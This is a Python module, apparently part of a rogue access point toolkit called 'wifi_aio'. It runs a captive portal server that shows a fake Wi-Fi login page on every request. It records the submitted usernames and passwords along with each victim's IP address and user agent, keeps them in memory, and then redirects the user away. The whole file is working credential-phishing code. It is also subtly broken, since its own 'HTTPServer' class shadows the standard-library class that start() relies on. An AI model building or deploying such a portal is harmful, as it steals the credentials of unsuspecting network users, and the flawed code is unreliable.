"""HTTPServer – simple HTTP captive portal server.

Serves a captive portal page and captures POSTed credentials.
Built on the standard library's ``http.server`` so there are no
external dependencies.
"""

import json
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Callable, Dict, List, Optional
from urllib.parse import parse_qs, urlparse

from wifi_aio.exceptions import WiFiConnectionError, WiFiTimeoutError
from wifi_aio.logger import get_logger

logger = get_logger("rogue.http_server")


class _PortalHandler(BaseHTTPRequestHandler):
    """Request handler that serves the captive-portal and logs credentials."""

    # Set by HTTPServer before serving
    portal_html: str = ""
    redirect_url: str = "http://www.example.com"
    credential_callback: Optional[Callable[[Dict[str, str]], None]] = None

    def do_GET(self) -> None:
        """Serve the captive portal page for every GET request."""
        parsed = urlparse(self.path)
        if parsed.path in ("/", "/index.html", "/login", "/connect"):
            self._serve_portal()
        elif parsed.path == "/status":
            self._serve_status()
        else:
            # Redirect unknown paths back to the portal
            self._serve_portal()

    def do_POST(self) -> None:
        """Handle credential submission from the portal form."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        # Parse form-encoded or JSON body
        credentials: Dict[str, str] = {}
        content_type = self.headers.get("Content-Type", "application/x-www-form-urlencoded")

        if "application/json" in content_type:
            try:
                credentials = json.loads(body)
            except json.JSONDecodeError:
                credentials = {"raw": body}
        else:
            parsed = parse_qs(body)
            credentials = {k: v[0] for k, v in parsed.items() if v}

        # Add client info
        credentials["_client_ip"] = self.client_address[0]
        credentials["_user_agent"] = self.headers.get("User-Agent", "")

        logger.info("Captured credentials from %s: %s", self.client_address[0], list(credentials.keys()))

        if self.credential_callback:
            self.credential_callback(credentials)

        # Respond with a "success" page or redirect
        self.send_response(302)
        self.send_header("Location", self.redirect_url)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"")

    def log_message(self, format: str, *args: object) -> None:
        """Override to use wifi_aio logger instead of stderr."""
        logger.debug("HTTP %s", format % args)

    def _serve_portal(self) -> None:
        """Send the portal HTML page."""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(self.portal_html.encode("utf-8"))

    def _serve_status(self) -> None:
        """Return a simple JSON status payload."""
        payload = json.dumps({"status": "running", "server": "WiFiAIO HTTP"}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


class HTTPServer:
    """Simple HTTP captive portal server.

    Parameters
    ----------
    bind_ip:
        IP address to bind to (typically the AP IP).
    port:
        TCP port to listen on.
    portal_html:
        HTML content for the captive portal page.
    redirect_url:
        URL to redirect clients to after credential capture.
    credential_callback:
        Called with a dict of captured credentials each time a POST
        is received.
    """

    def __init__(
        self,
        bind_ip: str = "10.0.0.1",
        port: int = 80,
        portal_html: str = "",
        redirect_url: str = "http://www.example.com",
        credential_callback: Optional[Callable[[Dict[str, str]], None]] = None,
    ) -> None:
        self.bind_ip = bind_ip
        self.port = port
        self.portal_html = portal_html or self._default_portal()
        self.redirect_url = redirect_url
        self.credential_callback = credential_callback
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._captured: List[Dict[str, str]] = []

    # ── Default portal HTML ────────────────────────────────────────────

    @staticmethod
    def _default_portal() -> str:
        """Return a minimal default captive portal login page."""
        return """<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<h2>WiFi Network Login</h2>
<form method="POST" action="/login">
  <label>Username: <input type="text" name="username"></label><br><br>
  <label>Password: <input type="password" name="password"></label><br><br>
  <input type="submit" value="Connect">
</form>
</body>
</html>"""

    # ── Server lifecycle ───────────────────────────────────────────────

    def start(self) -> None:
        """Start the HTTP server in a background daemon thread."""
        if self._server is not None:
            logger.warning("HTTP server already running")
            return

        handler = _PortalHandler
        handler.portal_html = self.portal_html
        handler.redirect_url = self.redirect_url
        handler.credential_callback = self._on_credential

        self._server = HTTPServer((self.bind_ip, self.port), handler)
        self._thread = threading.Thread(
            target=self._server.serve_forever,
            daemon=True,
            name="http-portal",
        )
        self._thread.start()
        logger.info("HTTP captive portal listening on %s:%d", self.bind_ip, self.port)

    def stop(self) -> None:
        """Shut down the HTTP server."""
        if self._server is not None:
            self._server.shutdown()
            self._server.server_close()
            self._server = None
            logger.info("HTTP captive portal stopped")

    def is_running(self) -> bool:
        """Return ``True`` if the server thread is alive."""
        return self._thread is not None and self._thread.is_alive()

    def get_captured(self) -> List[Dict[str, str]]:
        """Return all captured credentials so far."""
        return list(self._captured)

    def clear_captured(self) -> None:
        """Clear the in-memory credential store."""
        self._captured.clear()

    def status(self) -> Dict[str, object]:
        """Return a status dictionary."""
        return {
            "running": self.is_running(),
            "bind": f"{self.bind_ip}:{self.port}",
            "captured_count": len(self._captured),
        }

    # ── Internals ──────────────────────────────────────────────────────

    def _on_credential(self, creds: Dict[str, str]) -> None:
        """Store credentials and forward to the user callback."""
        self._captured.append(creds)
        if self.credential_callback:
            self.credential_callback(creds)
